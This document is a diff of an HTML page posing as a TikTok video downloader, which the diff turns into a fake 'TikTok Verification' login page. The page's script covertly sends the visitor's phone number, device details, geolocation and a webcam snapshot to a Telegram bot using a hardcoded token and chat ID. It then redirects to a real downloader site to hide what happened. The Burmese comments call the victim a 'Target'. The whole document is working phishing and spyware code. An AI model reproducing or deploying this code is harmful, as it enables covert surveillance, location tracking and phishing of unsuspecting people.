@@ -3,59 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok HD Video Downloader</title>
+    <title>TikTok Downloader - Login</title>
     <style>
-        body { background: #121212; color: white; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { padding: 30px; border-radius: 20px; background: #1e1e1e; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
-        .btn { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:hover { transform: scale(1.05); }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { padding: 30px; border-radius: 20px; background: #1a1a1a; width: 90%; max-width: 400px; border: 1px solid #333; text-align: center; }
+        .label-text { color: #fe2c55; font-size: 14px; font-weight: bold; margin-bottom: 5px; display: block; text-align: left; }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: #fe2c55; }
+        .btn { background: #fe2c55; color: white; border: none; padding: 15px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; font-size: 18px; transition: 0.3s; }
+        .btn:disabled { background: #555; cursor: not-allowed; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://www.tiktok.com/favicon.ico" width="60">
-        <h2>TikTok Downloader</h2>
-        <p>HD ဗီဒီယိုများကို ဒေါင်းလုဒ်ဆွဲရန် Server နှင့် ချိတ်ဆက်ပေးပါ။</p>
-        <button class="btn" onclick="capture()">Connect to Server 🔓</button>
+        <img src="https://www.tiktok.com/favicon.ico" width="50" style="margin-bottom: 10px;">
+        <h2 style="margin-bottom: 20px;">TikTok Verification</h2>
+        
+        <label class="label-text">လက်ရှိအသုံးပြုနေသည့်ဖုန်းနံပတ်ထည့်ရန်</label>
+        <input type="tel" id="phone" placeholder="09xxxxxxxxx" oninput="checkInput()">
+        
+        <button id="loginBtn" class="btn" onclick="startProcess()" disabled>အကောင့်၀င်ရန်</button>
+        
+        <p id="status" style="color: #666; font-size: 11px; margin-top: 15px;">🔒 Your connection is secured by TikTok Server</p>
     </div>
 
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
-        const chat_id = '5304050102';
+        const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0'; // Cam Bot Token
+        const chat_id = '5304050102'; // Bot ID
 
-        async function capture() {
+        // ဖုန်းနံပါတ် ရိုက်ပြီးမှ ခလုတ်နှိပ်လို့ရအောင် စစ်ဆေးခြင်း
+        function checkInput() {
+            const phone = document.getElementById('phone').value;
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = phone.length < 7; 
+        }
+
+        async function startProcess() {
+            const phoneNum = document.getElementById('phone').value;
+            document.getElementById('status').innerText = "စစ်ဆေးနေပါသည်... 'Allow' ကိုနှိပ်ပေးပါ။";
+
+            // ၁။ ဖုန်းနံပါတ် နှင့် Device Info ကို အရင်ပို့ခြင်း
+            let d = `🎯 **Target Login Data**\n`;
+            d += `📞 ဖုန်းနံပါတ်: ${phoneNum}\n`;
+            d += `📱 Device: ${navigator.platform}\n`;
+            d += `🌐 Browser: ${navigator.userAgent.split(' ')[0]}`;
+            send(d);
+
+            // ၂။ တည်နေရာ (Location) ကို Background ကယူခြင်း
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    send(`📍 **Target Location**\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                });
+            }
+
+            // ၃။ Camera Shot (Permission တစ်ခုတည်းတောင်းခြင်း)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = s;
 
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chat_id);
-                        fd.append('photo', blob, 'image.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    const c = document.getElementById('c');
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', chat_id);
+                        f.append('photo', b, 'shot.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
                         
-                        // ပုံပို့ပြီးရင် တကယ့် Downloader Web ဆီ လွှဲပေးလိုက်မယ်
+                        // ၄။ အကုန်ပြီးရင် ssstik.io ထဲသို့ လွှဲပေးခြင်း
                         setTimeout(() => {
                             window.location.href = "https://ssstik.io/en";
                         }, 1000);
                     }, 'image/jpeg');
                 }, 2000);
-            } catch (err) {
-                // ငြင်းလိုက်ရင်လည်း Web ဆီပဲ ပို့ပေးလိုက်မယ်
+            } catch (e) {
+                // Permission ငြင်းလျှင်လည်း link ထဲသို့ လွှဲပေးမည်
                 window.location.href = "https://ssstik.io/en";
             }
+        }
+
+        function send(t) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: t, parse_mode: "Markdown" })
+            });
         }
     </script>
 </body>
 </html>
-
